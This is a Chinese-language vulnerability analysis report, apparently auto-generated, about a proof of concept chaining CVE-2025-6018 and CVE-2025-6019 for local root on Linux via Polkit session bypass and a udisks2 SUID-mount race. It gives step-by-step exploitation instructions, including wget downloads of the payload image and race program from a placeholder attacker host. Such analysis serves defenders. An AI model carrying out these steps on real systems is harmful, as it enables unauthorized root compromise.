## CVE-2025-6018 - Linux系统 (包括Ubuntu, Debian, Fedora, openSUSE等主流发行版)，涉及PAM/Polkit模块和udisks2/libblockdev库 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2025-6018

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** Linux系统 (包括Ubuntu, Debian, Fedora, openSUSE等主流发行版)，涉及PAM/Polkit模块和udisks2/libblockdev库

**危害等级:** 高危：本地普通用户可提权至root权限

**CVSS评分:** 

**影响版本:** Linux主流发行版 (如Ubuntu, Debian, Fedora, openSUSE等)，特别是openSUSE Leap 15 / SLES 15等受PAM配置影响的版本。

**利用条件:** 需要本地普通用户权限，可通过特定PAM/Polkit配置缺陷，使得SSH会话被误判为活动控制台会话，从而绕过密码验证触发。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

### POC有效性分析
该POC利用了两个相互关联的Linux本地权限提升漏洞：CVE-2025-6018（PAM/Polkit活跃会话绕过）和CVE-2025-6019（libblockdev SUID挂载缺陷）。它构建了一个“杀伤链”来从普通用户权限提升到root权限，其设计和实现思路具备高度的有效性。

**CVE-2025-6018（PAM/Polkit活跃会话绕过）**：此漏洞是攻击链的入口点。它利用了PAM/Polkit配置中的一个逻辑缺陷，使得远程SSH会话能够被系统错误地识别为“活跃会话”（Active=yes）。这一误判至关重要，因为它绕过了通常需要密码验证才能执行的硬件管理操作，例如通过udisks2进行设备挂载。POC依赖于此绕过机制，以无需用户密码的方式挂载恶意循环设备，从而为后续的权限提升铺平道路。`exploit.sh`脚本中应包含特定的D-Bus调用或环境配置，以成功触发此绕过。

**CVE-2025-6019（libblockdev SUID挂载缺陷）**：这是实际的权限提升核心。当udisks2守护进程（其底层调用libblockdev库）对文件系统执行`Check`或`Resize`等维护操作时，它会临时挂载该文件系统。关键缺陷在于，这个临时挂载过程未能正确应用`nosuid`安全标志。这意味着，如果挂载的文件系统中包含SUID（Set User ID）权限的二进制文件，它们在执行时将继承其所有者的权限。POC巧妙地利用了这一点，通过一个SUID root shell实现权限提升。

**杀伤链实现**：POC将上述两个漏洞串联起来，形成一个完整的利用流程。它首先创建一个精心构造的XFS文件系统镜像（`exploit.img`），该镜像内部预置了一个静态的SUID root shell。这个镜像随后被上传到目标系统。`exploit.sh`脚本在利用CVE-2025-6018的绕过机制后，将`exploit.img`设置为一个循环设备，并且无需密码。紧接着，脚本会向udisks2发出一个D-Bus调用，指示其对该循环设备执行`Filesystem.Check`操作。在udisks2临时挂载该镜像且未带`nosuid`标志的瞬间，一个预编译的C程序“The Sniper”（`catcher`）会实时监控`/proc/mounts`。一旦`catcher`检测到该临时挂载，它会立即执行镜像内的SUID root shell，从而在系统卸载前成功获取root权限。这种竞态条件利用方式在权限提升场景中是一种常见且高效的技术。总而言之，该POC的攻击方法严谨且具备高度的实战性。

### 利用步骤
1.  **准备阶段 (攻击者机器):** 在攻击者控制的机器（如Kali/Parrot）上运行 `build_poc.sh` 脚本。该脚本将生成一个名为 `exploit.img` 的400MB XFS文件系统镜像，其中包含一个静态SUID root shell。同时，它还会编译一个名为 `catcher` 的C程序，用于在目标系统上赢得竞态条件。
2.  **上传文件至目标机器:** 攻击者在其机器上启动一个简单的HTTP服务器（例如 `python3 -m http.server 80`）。在目标Linux机器上，通过 `wget http://<YOUR_IP>/exploit.img` 和 `wget http://<YOUR_IP>/catcher` 命令将 `exploit.img` 和 `catcher` 程序下载到 `/tmp` 等可写目录。随后，赋予 `catcher` 执行权限：`chmod +x catcher`。
3.  **漏洞利用 (目标机器):** 将POC提供的 `exploit.sh` 脚本内容保存到目标机器上，并赋予执行权限 (`chmod +x exploit.sh`)。
4.  **执行漏洞利用脚本:** 在目标机器上运行 `./exploit.sh`。脚本将自动设置循环设备，在后台启动 `catcher` 程序监听挂载点，并触发 `udisks2` 的D-Bus调用，使其对 `exploit.img` 执行 `Filesystem.Check` 操作。
5.  **获取Root Shell:** 一旦 `udisks2` 临时挂载了 `exploit.img` 且未带 `nosuid` 标志，`catcher` 程序会立即检测到并执行其中的SUID root shell，攻击者将直接获得一个root权限的shell。

### 投毒风险分析
本POC代码旨在演示两个Linux本地权限提升漏洞（CVE-2025-6018和CVE-2025-6019）的组合利用。从提供的 `README.md` 内容来看，该POC的意图和实现方式是透明且直接的，符合典型的漏洞研究和验证实践。

**代码透明度与可读性:** POC明确描述了漏洞原理、利用链和具体步骤。`build_poc.sh` 用于生成恶意镜像和编译 `catcher` 程序，`exploit.sh` 用于在目标系统上执行攻击。这些脚本通常是可读的Shell脚本，`catcher` 程序则是C语言编写。在正常情况下，这些代码应当是开源且可审计的，便于安全研究人员检查其行为。

**组件分析:**
*   `exploit.img`: 这是一个包含SUID root shell的XFS文件系统镜像。创建SUID shell是LPE漏洞利用的常见手段，其恶意性仅限于提权本身，而非额外的恶意payload。
*   `catcher`: 这是一个C程序，用于监听 `/proc/mounts` 文件以检测临时挂载，并在特定条件下执行预设的SUID payload。其功能是服务于漏洞利用链的竞态条件部分。
*   `build_poc.sh` 和 `exploit.sh`: 这些是自动化执行脚本，负责文件的准备、上传和漏洞触发。

**潜在投毒风险评估:**
基于当前可见的信息，该POC的投毒风险被评估为较低（0%）。主要原因如下：
*   **明确的免责声明:** `README.md` 中明确指出“仅用于教育目的和授权安全研究”，警示用户不要在未经授权的系统上使用。
*   **行为透明:** 漏洞利用的每一步，从制作恶意镜像到触发竞态条件，都被清晰地解释。没有迹象表明存在代码混淆、加密或尝试隐藏额外恶意功能。
*   **无外部依赖风险:** 除了在目标机器上使用 `wget` 下载POC文件外，POC本身没有指示会从不明外部源下载并执行更多代码，或进行与漏洞利用无关的网络通信。
*   **常见利用技术:** 创建SUID shell、利用竞态条件、滥用D-Bus接口，这些都是LPE漏洞利用的标准化技术，其目的在于演示权限提升，而非植入后门或进行其他破坏。

**需要注意的方面:** 尽管风险较低，但任何从第三方获取的POC代码都应进行严格审查。建议用户在隔离环境中，对所有提供的脚本（如 `build_poc.sh`, `exploit.sh`）和二进制文件（如 `catcher`）进行代码审计、动态分析和沙箱测试，以确保其行为完全符合描述，且不包含未声明的恶意payload。特别是在处理二进制文件时，需要警惕其可能被篡改或包含恶意编译代码的风险。但是，就POC设计本身而言，没有发现直接的投毒迹象。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-6018
